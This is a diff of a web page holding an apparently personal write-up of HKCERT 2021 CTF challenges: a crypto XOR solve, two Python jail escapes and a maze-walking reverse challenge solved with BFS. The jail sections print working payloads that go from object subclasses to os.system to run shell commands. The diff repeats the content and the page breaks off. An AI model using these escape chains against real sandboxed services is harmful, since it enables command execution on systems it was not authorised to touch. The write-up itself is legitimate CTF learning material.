+</span></span><span class=line><span class=cl>r = remote(&#34;chalp.hkcert21.pwnable.hk&#34;, 28102)
+</span></span><span class=line><span class=cl>r.recvuntil(b&#39;&gt; &#39;)
+</span></span><span class=line><span class=cl>r.sendline(b&#39;cfb data &#39;+ b&#39;0&#39;*160)
+</span></span><span class=line><span class=cl>s1 = r.recvline()[:-1]
+</span></span><span class=line><span class=cl>r.recvuntil(b&#39;&gt; &#39;)
+</span></span><span class=line><span class=cl>r.sendline(b&#39;ofb flag&#39;)
+</span></span><span class=line><span class=cl>s2 = r.recvline()[:-1]
+</span></span><span class=line><span class=cl>r.close()
+</span></span><span class=line><span class=cl>t = xor(bin(int(s1,16))[2:],bin(int(s2,16))[2:])
+</span></span><span class=line><span class=cl>print(long_to_bytes(int(t,2)))
+</span></span></code></pre></td></tr></table></div></div><p>FLAG : <strong>hkcert21{w3_sh0u1d_n0t_g1v3_much_fr3ed0m_t0_us3r5_wh3n_1t_c0m3s_t0_cryp70gr4phy}</strong></p><h2 id=所有遺失的東西-all-missing---pwn-150-points>所有遺失的東西 (All Missing) - pwn (150 points)</h2><h3 id=challenge--1>Challenge :</h3><blockquote><p>You lose all the things, including the chance of getting out of the jail of python.
+nc chalp.hkcert21.pwnable.hk 28004</p></blockquote><h3 id=files--1>Files :</h3><p><a href=/files/HKCERT/pyjail1_f7be93352498ebd158a0a9fc069b30e9.zip rel>pyjail1_f7be93352498ebd158a0a9fc069b30e9.zip</a></p><h3 id=solution--1>Solution :</h3><p>I was working on some other challenge while my teammate asked for help, so I checked this challenge. It is a Pythohn jail escape challenge. <code>__builtins__</code> is clear and the square brackets<code>[]</code> are not allowed to use.</p><p>I did some googling and found some payloads such as <code>().__class__.__base__.__subclasses__()</code> or <code>''.__class__.__mro__.__getitem__(1).__subclasses__()</code> to get some &ldquo;benign&rdquo; subclasses from modules imported in memory by default, even we dont have <code>__builtins__</code>.Moreover, we can use <code>__getitem__(i)</code> or <code>pop(i)</code> to replace the use of <code>[]</code>.</p><p>After some checking, we found the class <code>&lt;class 'os._wrap_close'></code> which has the method <code>popen</code>. We first call <code>__init__</code> to initiate with <code>__globals__</code> to get the method as dictionary.</p><p><strong>Solve:</strong></p><div class=highlight><div class=chroma><table class=lntable><tr><td class=lntd><pre tabindex=0 class=chroma><code><span class=lnt>1
+</span></code></pre></td><td class=lntd><pre tabindex=0 class=chroma><code class=language-fallback data-lang=fallback><span class=line><span class=cl>().__class__.__base__.__subclasses__().pop(133).__init__.__globals__.pop(&#39;system&#39;)(&#39;cat flag.txt&#39;)
+</span></span></code></pre></td></tr></table></div></div><p>FLAG : <strong>hkcert21{nev3r_uSe_pYth0n_45_sanDBox}</strong></p><h2 id=留下來的人-the-remaining-one---pwn-misc-300-points>留下來的人 (The Remaining One) - pwn, misc (300 points)</h2><h3 id=challenge--2>Challenge :</h3><blockquote><p>Find out the only one who always stand by you, that&rsquo;s the key of the escape.
+nc chalp.hkcert21.pwnable.hk 28005</p></blockquote><h3 id=files--2>Files :</h3><p><a href=/files/HKCERT/pyjail2_5ce6175d2c2cc1469d1188f029c356cb.zip rel>pyjail2_5ce6175d2c2cc1469d1188f029c356cb.zip</a></p><h3 id=solution--2>Solution :</h3><p>It was at the midnight after finished the first Python jailbreak chall above. I decided to have a look into the second part as well and got the first blood luckily.</p><p>The difference between this and the last chall is that the payload was restricted within length <code>59</code>. Therefore we cannot &ldquo;reuse&rdquo; the payload in the first part. However, is it really the case?</p><p>Actually the another diff alerted me, unlike the first part that you can only have 1 input, you can have infinite round of input. This made me thinking about &ldquo;splitting and storing&rdquo; the payload in each round and call it at the end. First I tried something like <code>a = "xxx"</code> but it returned a SyntaxError, as it is inside the <code>eval</code> you cannot assign variable like that.</p><p>Then I realised that although <code>__builtins__</code> was clear, this dict still exist and can be used. To assign the value for dictionary, we can use <code>update</code>. Therefore, what we need to do is just split the previous payload, use <code>update</code> to store the payload to the dict and &mldr;Done!</p><p><strong>Solve:</strong></p><div class=highlight><div class=chroma><table class=lntable><tr><td class=lntd><pre tabindex=0 class=chroma><code><span class=lnt>1
 </span><span class=lnt>2
 </span><span class=lnt>3
 </span><span class=lnt>4
 </span><span class=lnt>5
-</span></code></pre></td>
-<td class=lntd>
-<pre tabindex=0 class=chroma><code class=language-fallback data-lang=fallback>__builtins__.update({&#39;a&#39;: ().__class__.__base__})
-__builtins__.update({&#39;a&#39;: a.__subclasses__()})
-__builtins__.update({&#39;a&#39;: a.pop(133).__init__})
-__builtins__.update({&#39;a&#39;: a.__globals__})
-a.pop(&#39;system&#39;)(&#39;cat flag.txt&#39;)
-</code></pre></td></tr></table>
-</div>
-</div><p>FLAG : <strong>hkcert21{cr0sS_namesP4se__builtin__breaK_the_JAIL}</strong></p>
-<h2 id=最難行的路-the-hardest-path---reverse-misc-300-points>最難行的路 (The Hardest Path) - reverse, misc (300 points)</h2>
-<h3 id=challenge--3>Challenge :</h3>
-<blockquote>
-<blockquote>
-<p>寧願不揀最易的路 行極還未到 寧願你最後未傾慕 但信念安好 在意的 不再是 愛的煩惱 是哪樣做人 更清高 餘生那段旅途 與哪類人共舞</p>
-</blockquote>
-</blockquote>
-<blockquote>
-<p>When you think reverse engineering is hard, try working on reverse engineering challenges those need your algorithmic thinking skills!</p>
-</blockquote>
-<blockquote>
-<p>nc chalp.hkcert21.pwnable.hk 28005</p>
-</blockquote>
-<h3 id=files--3>Files :</h3>
-<p><a href=/files/HKCERT/the-hardest-path_e00c6aa7b64b8dc2a06e577937b5b07c.zip rel>the-hardest-path_e00c6aa7b64b8dc2a06e577937b5b07c.zip</a></p>
-<h3 id=solution--3>Solution :</h3>
-<p>This is my favourite challenge in this CTF since I made a huge mistake when solving it&mldr;
-Two python files were provided, <code>chall.py</code> and <code>lost.py</code>. The <code>chall.py</code> serves as a server, receving a Proof-of-Work and some &ldquo;inputs&rdquo;. If the input is correct, the flag will be returned. <code>lost.py</code> contains the real chall and logic, with some slightly obfuscated codes/variables.</p>
-<p>To put it simply, after the reverse,</p>
-<ul>
-<li>Line 3 defined 4 instructions of movements, i.e., North (&lsquo;N&rsquo;), East (&lsquo;E&rsquo;), West (&lsquo;W&rsquo;) and South (&lsquo;S&rsquo;).</li>
-</ul>
-<div class=highlight><div class=chroma>
-<table class=lntable><tr><td class=lntd>
-<pre tabindex=0 class=chroma><code><span class=lnt>1
-</span></code></pre></td>
-<td class=lntd>
-<pre tabindex=0 class=chroma><code class=language-fallback data-lang=fallback>mystery = &#39;NEWS&#39;
-</code></pre></td></tr></table>
-</div>
-</div><ul>
-<li>Line 5 defined a function to represent a dead-end.</li>
-</ul>
-<div class=highlight><div class=chroma>
-<table class=lntable><tr><td class=lntd>
-<pre tabindex=0 class=chroma><code><span class=lnt>1
-</span></code></pre></td>
-<td class=lntd>
-<pre tabindex=0 class=chroma><code class=language-fallback data-lang=fallback>def _29aa7a86665899ed(_050ca071ab51aece): raise Exception(&#39;😵‍💫💫🧱&#39;)
-</code></pre></td></tr></table>
-</div>
-</div><ul>
-<li>Line 7 - 15 defined the checking on whether the instructions is one of the &ldquo;NEWS&rdquo;, as well as whether we have arrived the end after all provided instructions</li>
-</ul>
-<div class=highlight><div class=chroma>
-<table class=lntable><tr><td class=lntd>
-<pre tabindex=0 class=chroma><code><span class=lnt>1
+</span></code></pre></td><td class=lntd><pre tabindex=0 class=chroma><code class=language-fallback data-lang=fallback><span class=line><span class=cl>__builtins__.update({&#39;a&#39;: ().__class__.__base__})
+</span></span><span class=line><span class=cl>__builtins__.update({&#39;a&#39;: a.__subclasses__()})
+</span></span><span class=line><span class=cl>__builtins__.update({&#39;a&#39;: a.pop(133).__init__})
+</span></span><span class=line><span class=cl>__builtins__.update({&#39;a&#39;: a.__globals__})
+</span></span><span class=line><span class=cl>a.pop(&#39;system&#39;)(&#39;cat flag.txt&#39;)
+</span></span></code></pre></td></tr></table></div></div><p>FLAG : <strong>hkcert21{cr0sS_namesP4se__builtin__breaK_the_JAIL}</strong></p><h2 id=最難行的路-the-hardest-path---reverse-misc-300-points>最難行的路 (The Hardest Path) - reverse, misc (300 points)</h2><h3 id=challenge--3>Challenge :</h3><blockquote><blockquote><p>寧願不揀最易的路 行極還未到 寧願你最後未傾慕 但信念安好 在意的 不再是 愛的煩惱 是哪樣做人 更清高 餘生那段旅途 與哪類人共舞</p></blockquote></blockquote><blockquote><p>When you think reverse engineering is hard, try working on reverse engineering challenges those need your algorithmic thinking skills!</p></blockquote><blockquote><p>nc chalp.hkcert21.pwnable.hk 28005</p></blockquote><h3 id=files--3>Files :</h3><p><a href=/files/HKCERT/the-hardest-path_e00c6aa7b64b8dc2a06e577937b5b07c.zip rel>the-hardest-path_e00c6aa7b64b8dc2a06e577937b5b07c.zip</a></p><h3 id=solution--3>Solution :</h3><p>This is my favourite challenge in this CTF since I made a huge mistake when solving it&mldr;
+Two python files were provided, <code>chall.py</code> and <code>lost.py</code>. The <code>chall.py</code> serves as a server, receving a Proof-of-Work and some &ldquo;inputs&rdquo;. If the input is correct, the flag will be returned. <code>lost.py</code> contains the real chall and logic, with some slightly obfuscated codes/variables.</p><p>To put it simply, after the reverse,</p><ul><li>Line 3 defined 4 instructions of movements, i.e., North (&lsquo;N&rsquo;), East (&lsquo;E&rsquo;), West (&lsquo;W&rsquo;) and South (&lsquo;S&rsquo;).</li></ul><div class=highlight><div class=chroma><table class=lntable><tr><td class=lntd><pre tabindex=0 class=chroma><code><span class=lnt>1
+</span></code></pre></td><td class=lntd><pre tabindex=0 class=chroma><code class=language-fallback data-lang=fallback><span class=line><span class=cl>mystery = &#39;NEWS&#39;
+</span></span></code></pre></td></tr></table></div></div><ul><li>Line 5 defined a function to represent a dead-end.</li></ul><div class=highlight><div class=chroma><table class=lntable><tr><td class=lntd><pre tabindex=0 class=chroma><code><span class=lnt>1
+</span></code></pre></td><td class=lntd><pre tabindex=0 class=chroma><code class=language-fallback data-lang=fallback><span class=line><span class=cl>def _29aa7a86665899ed(_050ca071ab51aece): raise Exception(&#39;😵‍💫💫🧱&#39;)
+</span></span></code></pre></td></tr></table></div></div><ul><li>Line 7 - 15 defined the checking on whether the instructions is one of the &ldquo;NEWS&rdquo;, as well as whether we have arrived the end after all provided instructions</li></ul><div class=highlight><div class=chroma><table class=lntable><tr><td class=lntd><pre tabindex=0 class=chroma><code><span class=lnt>1
 </span><span class=lnt>2
 </span><span class=lnt>3
 </span><span class=lnt>4
@@ -337,43 +78,26 @@ Two python files were provided, <code>chall.py</code> and <code>lost.py</code>. 
 </span><span class=lnt>7
 </span><span class=lnt>8
 </span><span class=lnt>9
-</span></code></pre></td>
-<td class=lntd>
-<pre tabindex=0 class=chroma><code class=language-fallback data-lang=fallback>def _f42fb5e137443877(_a78810bb76cc7d70, *_ab1bbf35017f4f42):
-    def _e6aea2db2242b19f(_41d28eb8c27952c3):
-        if len(_41d28eb8c27952c3) == 0:
-            if not _a78810bb76cc7d70: raise Exception(&#39;🤷🏁😕&#39;)
-            return
-        _03d38fa3a589db14, _41d28eb8c27952c3 = _41d28eb8c27952c3[0], _41d28eb8c27952c3[1:]
-        return globals()[_ab1bbf35017f4f42[mystery.index(_03d38fa3a589db14)]](_41d28eb8c27952c3) if _03d38fa3a589db14 in mystery else _e6aea2db2242b19f(_41d28eb8c27952c3)
-
-    return _e6aea2db2242b19f
-</code></pre></td></tr></table>
-</div>
-</div><ul>
-<li>The remaining lines are the paths / relationship of each node, telling you the neighbour of each direction you go from this node (_f42fb5e137443877[0] => whether it is the end,_f42fb5e137443877[1], _f42fb5e137443877[2], _f42fb5e137443877[3], _f42fb5e137443877[4] -> &lsquo;N&rsquo;, &lsquo;E&rsquo;, &lsquo;W&rsquo;, &lsquo;S&rsquo;)</li>
-</ul>
-<div class=highlight><div class=chroma>
-<table class=lntable><tr><td class=lntd>
-<pre tabindex=0 class=chroma><code><span class=lnt>1
+</span></code></pre></td><td class=lntd><pre tabindex=0 class=chroma><code class=language-fallback data-lang=fallback><span class=line><span class=cl>def _f42fb5e137443877(_a78810bb76cc7d70, *_ab1bbf35017f4f42):
+</span></span><span class=line><span class=cl>    def _e6aea2db2242b19f(_41d28eb8c27952c3):
+</span></span><span class=line><span class=cl>        if len(_41d28eb8c27952c3) == 0:
+</span></span><span class=line><span class=cl>            if not _a78810bb76cc7d70: raise Exception(&#39;🤷🏁😕&#39;)
+</span></span><span class=line><span class=cl>            return
+</span></span><span class=line><span class=cl>        _03d38fa3a589db14, _41d28eb8c27952c3 = _41d28eb8c27952c3[0], _41d28eb8c27952c3[1:]
+</span></span><span class=line><span class=cl>        return globals()[_ab1bbf35017f4f42[mystery.index(_03d38fa3a589db14)]](_41d28eb8c27952c3) if _03d38fa3a589db14 in mystery else _e6aea2db2242b19f(_41d28eb8c27952c3)
+</span></span><span class=line><span class=cl>
+</span></span><span class=line><span class=cl>    return _e6aea2db2242b19f
+</span></span></code></pre></td></tr></table></div></div><ul><li>The remaining lines are the paths / relationship of each node, telling you the neighbour of each direction you go from this node (_f42fb5e137443877[0] => whether it is the end,_f42fb5e137443877[1], _f42fb5e137443877[2], _f42fb5e137443877[3], _f42fb5e137443877[4] -> &lsquo;N&rsquo;, &lsquo;E&rsquo;, &lsquo;W&rsquo;, &lsquo;S&rsquo;)</li></ul><div class=highlight><div class=chroma><table class=lntable><tr><td class=lntd><pre tabindex=0 class=chroma><code><span class=lnt>1
 </span><span class=lnt>2
 </span><span class=lnt>3
 </span><span class=lnt>4
 </span><span class=lnt>5
-</span></code></pre></td>
-<td class=lntd>
-<pre tabindex=0 class=chroma><code class=language-fallback data-lang=fallback>...&lt;snipped&gt;...
-_2f00e51306a05b87 = _29aa7a86665899ed (represent dead-end)
-_328518a497015157 = _f42fb5e137443877(False, &#34;_ef5d07da6a407ff3&#34;, &#34;_3f49b6a9053121fb&#34;, &#34;_60de30732830eab8&#34;, &#34;_3ff69bef8add0e90&#34;) (The starting point)
-_8b0eb6f195ae182a = _f42fb5e137443877(True, &#34;_92ccf583b1b065ea&#34;, &#34;_d3084505a4a12123&#34;, &#34;_e335a503c47e5243&#34;, &#34;_ebff1548ca6e8dbd&#34;) (The only &#34;True&#34;, meaning it is the end)
-...&lt;snipped&gt;...
-</code></pre></td></tr></table>
-</div>
-</div><p>Therefore it is actually a chall that finding a path from the starting point <code>_328518a497015157</code> to the end <code>_8b0eb6f195ae182a</code>, with the movement as the instructions (a list of &ldquo;NNNNEEEEWWWWSSSS&rdquo;).</p>
-<p>First I copied the lines after line 15 to another file <code>path.txt</code> for parsing. As we dont want to move into a dead-end, I simply ignored all of them (i.e. the node = <code>_29aa7a86665899ed</code>), otherwise, I stored it with the neighbour into a dictionary. Then I walk through the dict again to find out all the dead-end node.</p>
-<div class=highlight><div class=chroma>
-<table class=lntable><tr><td class=lntd>
-<pre tabindex=0 class=chroma><code><span class=lnt> 1
+</span></code></pre></td><td class=lntd><pre tabindex=0 class=chroma><code class=language-fallback data-lang=fallback><span class=line><span class=cl>...&lt;snipped&gt;...
+</span></span><span class=line><span class=cl>_2f00e51306a05b87 = _29aa7a86665899ed (represent dead-end)
+</span></span><span class=line><span class=cl>_328518a497015157 = _f42fb5e137443877(False, &#34;_ef5d07da6a407ff3&#34;, &#34;_3f49b6a9053121fb&#34;, &#34;_60de30732830eab8&#34;, &#34;_3ff69bef8add0e90&#34;) (The starting point)
+</span></span><span class=line><span class=cl>_8b0eb6f195ae182a = _f42fb5e137443877(True, &#34;_92ccf583b1b065ea&#34;, &#34;_d3084505a4a12123&#34;, &#34;_e335a503c47e5243&#34;, &#34;_ebff1548ca6e8dbd&#34;) (The only &#34;True&#34;, meaning it is the end)
+</span></span><span class=line><span class=cl>...&lt;snipped&gt;...
+</span></span></code></pre></td></tr></table></div></div><p>Therefore it is actually a chall that finding a path from the starting point <code>_328518a497015157</code> to the end <code>_8b0eb6f195ae182a</code>, with the movement as the instructions (a list of &ldquo;NNNNEEEEWWWWSSSS&rdquo;).</p><p>First I copied the lines after line 15 to another file <code>path.txt</code> for parsing. As we dont want to move into a dead-end, I simply ignored all of them (i.e. the node = <code>_29aa7a86665899ed</code>), otherwise, I stored it with the neighbour into a dictionary. Then I walk through the dict again to find out all the dead-end node.</p><div class=highlight><div class=chroma><table class=lntable><tr><td class=lntd><pre tabindex=0 class=chroma><code><span class=lnt> 1
 </span><span class=lnt> 2
 </span><span class=lnt> 3
 </span><span class=lnt> 4
@@ -389,30 +113,23 @@ _8b0eb6f195ae182a = _f42fb5e137443877(True, &#34;_92ccf583b1b065ea&#34;, &#34;_d
 </span><span class=lnt>14
 </span><span class=lnt>15
 </span><span class=lnt>16
-</span></code></pre></td>
-<td class=lntd>
-<pre tabindex=0 class=chroma><code class=language-fallback data-lang=fallback>dict = {}
-f = open(&#34;path.txt&#34;, &#34;r&#34;)
-lines = f.read()
-for line in lines.split(&#39;\n&#39;):
-    if line:
-        tmp = line.split(&#39;=&#39;)
-        if tmp[1] == &#39; _29aa7a86665899ed&#39;:
-            continue
-        else:
-            t = tmp[1].split(&#39;&#34;&#39;)
-            if &#34;False&#34; in tmp[1]:
-                dict[tmp[0][:-1]] = [0, t[1], t[3], t[5], t[7]]
-            else:
-                dict[tmp[0][:-1]] = [1, t[1], t[3], t[5], t[7]]
-for k, v in dict.items():
-    dict[k] = [0 if (not(x in dict) and not(x)) else x for x in v]
-</code></pre></td></tr></table>
-</div>
-</div><p>Next we need to walk and get a path from the starting point to the end. I implemented a DFS (Depth-first search) to get the path</p>
-<div class=highlight><div class=chroma>
-<table class=lntable><tr><td class=lntd>
-<pre tabindex=0 class=chroma><code><span class=lnt> 1
+</span></code></pre></td><td class=lntd><pre tabindex=0 class=chroma><code class=language-fallback data-lang=fallback><span class=line><span class=cl>dict = {}
+</span></span><span class=line><span class=cl>f = open(&#34;path.txt&#34;, &#34;r&#34;)
+</span></span><span class=line><span class=cl>lines = f.read()
+</span></span><span class=line><span class=cl>for line in lines.split(&#39;\n&#39;):
+</span></span><span class=line><span class=cl>    if line:
+</span></span><span class=line><span class=cl>        tmp = line.split(&#39;=&#39;)
+</span></span><span class=line><span class=cl>        if tmp[1] == &#39; _29aa7a86665899ed&#39;:
+</span></span><span class=line><span class=cl>            continue
+</span></span><span class=line><span class=cl>        else:
+</span></span><span class=line><span class=cl>            t = tmp[1].split(&#39;&#34;&#39;)
+</span></span><span class=line><span class=cl>            if &#34;False&#34; in tmp[1]:
+</span></span><span class=line><span class=cl>                dict[tmp[0][:-1]] = [0, t[1], t[3], t[5], t[7]]
+</span></span><span class=line><span class=cl>            else:
+</span></span><span class=line><span class=cl>                dict[tmp[0][:-1]] = [1, t[1], t[3], t[5], t[7]]
+</span></span><span class=line><span class=cl>for k, v in dict.items():
+</span></span><span class=line><span class=cl>    dict[k] = [0 if (not(x in dict) and not(x)) else x for x in v]
+</span></span></code></pre></td></tr></table></div></div><p>Next we need to walk and get a path from the starting point to the end. I implemented a DFS (Depth-first search) to get the path</p><div class=highlight><div class=chroma><table class=lntable><tr><td class=lntd><pre tabindex=0 class=chroma><code><span class=lnt> 1
 </span><span class=lnt> 2
 </span><span class=lnt> 3
 </span><span class=lnt> 4
@@ -424,53 +141,25 @@ for k, v in dict.items():
 </span><span class=lnt>10
 </span><span class=lnt>11
 </span><span class=lnt>12
-</span></code></pre></td>
-<td class=lntd>
-<pre tabindex=0 class=chroma><code class=language-fallback data-lang=fallback>def dfs(node):
-    if 1 in dict[node]:
-        return 1
-    if node not in visited:
-        visited.add(node)
-        for i, neighbour in enumerate(dict[node]):
-            if neighbour != 0:
-                if dfs(neighbour):
-                    path.append([neighbour, mystery[dict[node].index(neighbour)-1]])
-                    return 1
-    else:
-        return 0
-</code></pre></td></tr></table>
-</div>
-</div><p>Then I got an error below</p>
-<div class=highlight><div class=chroma>
-<table class=lntable><tr><td class=lntd>
-<pre tabindex=0 class=chroma><code><span class=lnt>1
-</span></code></pre></td>
-<td class=lntd>
-<pre tabindex=0 class=chroma><code class=language-fallback data-lang=fallback>RecursionError: maximum recursion depth exceeded
-</code></pre></td></tr></table>
-</div>
-</div><p>and I did the biggest mistake in my life, that is adding <code>sys.setrecursionlimit(2000)</code> to my code to extend the limit of recursion depth, so that my program can work&mldr; and it did output the solution</p>
-<div class=highlight><div class=chroma>
-<table class=lntable><tr><td class=lntd>
-<pre tabindex=0 class=chroma><code><span class=lnt>1
-</span></code></pre></td>
-<td class=lntd>
-<pre tabindex=0 class=chroma><code class=language-fallback data-lang=fallback>SSSSEENNEESSSSEENNEEEEEEEESSSSEESSSSEESSEENNEESSSSWWSSWWSSSSWWSSSSWWWWWWSSWWSS...&lt;snipped&gt;...EEEEENNEEEESSEENNEEEESSSSSSSSWWSSWWSSSSWWSSSSSSEESSSSEEEESSEENNEESSEEEE
-</code></pre></td></tr></table>
-</div>
-</div><p>and then I got a <code>no good!</code> instead of the flag from the server. What could be wrong? (Someone: everything can go wrong will go wrong) After some dry run I am pretty sure that it is a valid path and it was around 3/4 at midnight so I decided let my brain to have some rest. On the next day I tried to change the code in <code>chall.py</code> to not catch the error and I got the same error again:</p>
-<div class=highlight><div class=chroma>
-<table class=lntable><tr><td class=lntd>
-<pre tabindex=0 class=chroma><code><span class=lnt>1
-</span></code></pre></td>
-<td class=lntd>
-<pre tabindex=0 class=chroma><code class=language-fallback data-lang=fallback>RecursionError: maximum recursion depth exceeded
-</code></pre></td></tr></table>
-</div>
-</div><p>Then I realised the problem is my solution is not optimized, i.e. we need to find the shortest path. Therefore, BFS (Breadth-First Search) should be used. (There is no weight/same weight for each edge in this chall)</p>
-<div class=highlight><div class=chroma>
-<table class=lntable><tr><td class=lntd>
-<pre tabindex=0 class=chroma><code><span class=lnt> 1
+</span></code></pre></td><td class=lntd><pre tabindex=0 class=chroma><code class=language-fallback data-lang=fallback><span class=line><span class=cl>def dfs(node):
+</span></span><span class=line><span class=cl>    if 1 in dict[node]:
+</span></span><span class=line><span class=cl>        return 1
+</span></span><span class=line><span class=cl>    if node not in visited:
+</span></span><span class=line><span class=cl>        visited.add(node)
+</span></span><span class=line><span class=cl>        for i, neighbour in enumerate(dict[node]):
+</span></span><span class=line><span class=cl>            if neighbour != 0:
+</span></span><span class=line><span class=cl>                if dfs(neighbour):
+</span></span><span class=line><span class=cl>                    path.append([neighbour, mystery[dict[node].index(neighbour)-1]])
+</span></span><span class=line><span class=cl>                    return 1
+</span></span><span class=line><span class=cl>    else:
+</span></span><span class=line><span class=cl>        return 0
+</span></span></code></pre></td></tr></table></div></div><p>Then I got an error below</p><div class=highlight><div class=chroma><table class=lntable><tr><td class=lntd><pre tabindex=0 class=chroma><code><span class=lnt>1
+</span></code></pre></td><td class=lntd><pre tabindex=0 class=chroma><code class=language-fallback data-lang=fallback><span class=line><span class=cl>RecursionError: maximum recursion depth exceeded
+</span></span></code></pre></td></tr></table></div></div><p>and I did the biggest mistake in my life, that is adding <code>sys.setrecursionlimit(2000)</code> to my code to extend the limit of recursion depth, so that my program can work&mldr; and it did output the solution</p><div class=highlight><div class=chroma><table class=lntable><tr><td class=lntd><pre tabindex=0 class=chroma><code><span class=lnt>1
+</span></code></pre></td><td class=lntd><pre tabindex=0 class=chroma><code class=language-fallback data-lang=fallback><span class=line><span class=cl>SSSSEENNEESSSSEENNEEEEEEEESSSSEESSSSEESSEENNEESSSSWWSSWWSSSSWWSSSSWWWWWWSSWWSS...&lt;snipped&gt;...EEEEENNEEEESSEENNEEEESSSSSSSSWWSSWWSSSSWWSSSSSSEESSSSEEEESSEENNEESSEEEE
+</span></span></code></pre></td></tr></table></div></div><p>and then I got a <code>no good!</code> instead of the flag from the server. What could be wrong? (Someone: everything can go wrong will go wrong) After some dry run I am pretty sure that it is a valid path and it was around 3/4 at midnight so I decided let my brain to have some rest. On the next day I tried to change the code in <code>chall.py</code> to not catch the error and I got the same error again:</p><div class=highlight><div class=chroma><table class=lntable><tr><td class=lntd><pre tabindex=0 class=chroma><code><span class=lnt>1
+</span></code></pre></td><td class=lntd><pre tabindex=0 class=chroma><code class=language-fallback data-lang=fallback><span class=line><span class=cl>RecursionError: maximum recursion depth exceeded
+</span></span></code></pre></td></tr></table></div></div><p>Then I realised the problem is my solution is not optimized, i.e. we need to find the shortest path. Therefore, BFS (Breadth-First Search) should be used. (There is no weight/same weight for each edge in this chall)</p><div class=highlight><div class=chroma><table class=lntable><tr><td class=lntd><pre tabindex=0 class=chroma><code><span class=lnt> 1
 </span><span class=lnt> 2
 </span><span class=lnt> 3
 </span><span class=lnt> 4
@@ -487,41 +176,26 @@ for k, v in dict.items():
 </span><span class=lnt>15
 </span><span class=lnt>16
 </span><span class=lnt>17
-</span></code></pre></td>
-<td class=lntd>
-<pre tabindex=0 class=chroma><code class=language-fallback data-lang=fallback>def bfs(start, goal):
-    visited = []
-    queue = [[[start, &#39;-1&#39;]]]
-    while queue:
-        path = queue.pop(0)
-        node = path[-1][0]
-        if node not in visited:
-            neighbours = dict[node]
-            for i, neighbour in enumerate(neighbours):
-                if neighbour != 0 and neighbour in dict:
-                    new_path = list(path)
-                    new_path.append([neighbour, mystery[i-1]])
-                    queue.append(new_path)
-                    if neighbour == goal:
-                        return new_path
-            visited.append(node)
-    return 0
-</code></pre></td></tr></table>
-</div>
-</div><p>and&mldr;we got the shorter path!</p>
-<div class=highlight><div class=chroma>
-<table class=lntable><tr><td class=lntd>
-<pre tabindex=0 class=chroma><code><span class=lnt>1
-</span></code></pre></td>
-<td class=lntd>
-<pre tabindex=0 class=chroma><code class=language-fallback data-lang=fallback>SSSSEENNEESSSSEENNEEEEEEEESSSSEESSSSWWSSSSEESSEESSSSWWSSSSWWWWWWSSWWSSSSSSEEEES...&lt;snipped&gt;...SSWWESSEENNEEEESSSSSSSSWWSSWWSSSSWWSSSSSSEESSSSEEEESSEENNEESSEEEE
-</code></pre></td></tr></table>
-</div>
-</div><p><strong>Solve:</strong></p>
-<p><code>process.py</code></p>
-<div class=highlight><div class=chroma>
-<table class=lntable><tr><td class=lntd>
-<pre tabindex=0 class=chroma><code><span class=lnt> 1
+</span></code></pre></td><td class=lntd><pre tabindex=0 class=chroma><code class=language-fallback data-lang=fallback><span class=line><span class=cl>def bfs(start, goal):
+</span></span><span class=line><span class=cl>    visited = []
+</span></span><span class=line><span class=cl>    queue = [[[start, &#39;-1&#39;]]]
+</span></span><span class=line><span class=cl>    while queue:
+</span></span><span class=line><span class=cl>        path = queue.pop(0)
+</span></span><span class=line><span class=cl>        node = path[-1][0]
+</span></span><span class=line><span class=cl>        if node not in visited:
+</span></span><span class=line><span class=cl>            neighbours = dict[node]
+</span></span><span class=line><span class=cl>            for i, neighbour in enumerate(neighbours):
+</span></span><span class=line><span class=cl>                if neighbour != 0 and neighbour in dict:
+</span></span><span class=line><span class=cl>                    new_path = list(path)
+</span></span><span class=line><span class=cl>                    new_path.append([neighbour, mystery[i-1]])
+</span></span><span class=line><span class=cl>                    queue.append(new_path)
+</span></span><span class=line><span class=cl>                    if neighbour == goal:
+</span></span><span class=line><span class=cl>                        return new_path
+</span></span><span class=line><span class=cl>            visited.append(node)
+</span></span><span class=line><span class=cl>    return 0
+</span></span></code></pre></td></tr></table></div></div><p>and&mldr;we got the shorter path!</p><div class=highlight><div class=chroma><table class=lntable><tr><td class=lntd><pre tabindex=0 class=chroma><code><span class=lnt>1
+</span></code></pre></td><td class=lntd><pre tabindex=0 class=chroma><code class=language-fallback data-lang=fallback><span class=line><span class=cl>SSSSEENNEESSSSEENNEEEEEEEESSSSEESSSSWWSSSSEESSEESSSSWWSSSSWWWWWWSSWWSSSSSSEEEES...&lt;snipped&gt;...SSWWESSEENNEEEESSSSSSSSWWSSWWSSSSWWSSSSSSEESSSSEEEESSEENNEESSEEEE
+</span></span></code></pre></td></tr></table></div></div><p><strong>Solve:</strong></p><p><code>process.py</code></p><div class=highlight><div class=chroma><table class=lntable><tr><td class=lntd><pre tabindex=0 class=chroma><code><span class=lnt> 1
 </span><span class=lnt> 2
 </span><span class=lnt> 3
 </span><span class=lnt> 4
@@ -564,57 +238,50 @@ for k, v in dict.items():
 </span><span class=lnt>41
 </span><span class=lnt>42
 </span><span class=lnt>43
-</span></code></pre></td>
-<td class=lntd>
-<pre tabindex=0 class=chroma><code class=language-fallback data-lang=fallback>flag = &#34;&#34;
-mystery = &#39;NEWS&#39;
-dict = {}
-
-f = open(&#34;path.txt&#34;, &#34;r&#34;)
-lines = f.read()
-for line in lines.split(&#39;\n&#39;):
-    if line:
-        tmp = line.split(&#39;=&#39;)
-        if tmp[1] == &#39; _29aa7a86665899ed&#39;:
-            continue
-        else:
-            t = tmp[1].split(&#39;&#34;&#39;)
-            if &#34;False&#34; in tmp[1]:
-                dict[tmp[0][:-1]] = [0, t[1], t[3], t[5], t[7]]
-            else:
-                dict[tmp[0][:-1]] = [1, t[1], t[3], t[5], t[7]]
-      
-for k, v in dict.items():
-    dict[k] = [0 if (not(x in dict) and not(x)) else x for x in v]
-
-def bfs(start, goal):
-    visited = []
-    queue = [[[start, &#39;-1&#39;]]]
-    while queue:
-        path = queue.pop(0)
-        node = path[-1][0]
-        if node not in visited:
-            neighbours = dict[node]
-            for i, neighbour in enumerate(neighbours):
-                if neighbour != 0 and neighbour in dict:
-                    new_path = list(path)
-                    new_path.append([neighbour, mystery[i-1]])
-                    queue.append(new_path)
-                    if neighbour == goal:
-                        return new_path
-            visited.append(node)
-    return 0
-p = bfs(&#39;_328518a497015157&#39;, &#39;_8b0eb6f195ae182a&#39;)
-
-for x in p:
-    flag = flag + x[1]
-print(flag[1:])
-</code></pre></td></tr></table>
-</div>
-</div><p><code>solve.py</code></p>
-<div class=highlight><div class=chroma>
-<table class=lntable><tr><td class=lntd>
